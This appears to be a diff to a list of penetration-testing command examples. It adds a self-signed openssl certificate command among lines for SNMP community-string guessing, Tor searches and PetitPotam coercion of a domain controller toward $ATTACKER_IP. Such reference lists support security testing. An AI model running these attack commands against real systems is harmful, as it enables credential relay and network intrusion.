@@ -190,6 +190,7 @@ onesixtyone 192.168.10.10 private
 onesixtyone 192.168.10.10 public
 onionsearch 'computer'
 onionsearch 'computer' --engines tor66 deeplink phobos --limit 3
+openssl req -newkey rsa:2048 -nodes -keyout ignite.key -x509 -days 1000 -subj '/CN=blog.r0land.link/O=f0zy./C=IN' -out ignite.crt
 openssl pkcs12 -in cert.pem -inkey priv.key -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
 petitpotam.py "$ATTACKER_IP" "$DC_HOST"
 petitpotam.py -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$ATTACKER_IP" "$DC_HOST"
